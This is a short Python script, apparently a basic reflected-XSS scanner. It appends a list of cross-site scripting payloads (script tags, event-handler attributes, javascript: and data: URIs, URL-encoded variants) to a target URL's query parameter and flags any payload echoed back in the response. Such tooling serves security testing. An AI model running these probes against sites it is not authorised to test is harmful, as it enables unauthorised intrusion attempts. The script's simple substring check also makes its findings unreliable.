import requests 
from bs4 import BeautifulSoup

#XSS payloads for testing
xss_payloads = [
    "<script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "';alert('XSS');//",
    "'';!--\"<XSS>=&{()}",
    "<svg/onload=alert('XSS')>",
    "<img src=x onerror=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src='javascript:alert(`XSS`)'></iframe>",
    "%3Cscript%3Ealert('XSS')%3C/script%3E",  
    "%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E",  
    "javascript:alert('XSS')",
    "data:text/html,<script>alert('XSS')</script>",
]

def scan_xss(target_url):
    print(f"Scanning {target_url} for XSS vulnerabilities...")

    for payload in xss_payloads:
        #Injecting payload into url parameter
        test_url = f"{target_url}{payload}"

        try:
            response = requests.get(test_url , timeout=10)
            soup = BeautifulSoup(response.text , "html.parser")

            if payload in response.text:
                print(f"Potential XSS vulnerability found at {target_url} with payload: {payload}")

            else:
                print(f"No XSS vulnerability found for payload: {payload}")

        except requests.exceptions.RequestException as e:
            print(f"Request failed :{e}")        

if __name__ == "__main__":
    target = input("Enter the target url with parameter (e.g., http://example.com/search?q=): ")    
    scan_xss(target)        